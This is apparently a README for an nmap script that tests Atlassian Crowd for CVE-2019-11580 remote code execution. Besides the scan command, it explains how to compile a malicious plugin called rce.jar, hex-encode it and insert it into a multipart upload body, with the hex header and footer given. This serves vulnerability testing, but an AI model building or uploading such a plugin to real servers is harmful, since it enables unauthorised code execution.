# CVE-2019-11580
## Atlassian Crowd and Crowd Data Center Remote Code Execution nmap script
Tests to see if a current installation of Atlassian Crowd or Crowd Data center is vulnerable to CVE-2019-11580. 

## Dependencies
* java (tested with openjdk version 11.0.14)
* python (tested with version 3.9.11)
* servlet-api (tested with version 3.1.0)
* nmap (tested with version 7.92)

## Run the script and see if you're vulnerable!
```
nmap -sV --script crowd-vuln-cve-2019-11580 -p 8095 --script-args "url=/" <target>
```
To compile a new plugin, see instructions below.

## Compile jar
```
javac -cp javax.servlet-api-3.1.0.jar com/cdl/plugin/exp.java
jar -cf rce.jar ./atlassian-plugin.xml ./com
```

## Convert jar to hex
E.g:
```
python convert_to_hex.py rce.jar
```
## Copy hex into plugin_hex string
The plugin hex needs to be inserted in the hex string, after the header and before the footer:

Header:
```
2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d6631356665383765393561370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c655f63646c223b2066696c656e616d653d227263652e6a6172220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a
```
Which in ASCII is:
```
------------------------------f15fe87e95a7
Content-Disposition: form-data; name="file_cdl"; filename="rce.jar"
Content-Type: application/octet-stream
```

Footer:
```
0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d6631356665383765393561372d2d0d0a
```
Which in ASCII is:
```

------------------------------f15fe87e95a7--
```

## Acknowledgements
Script based on python example from jas502n https://github.com/jas502n/CVE-2019-11580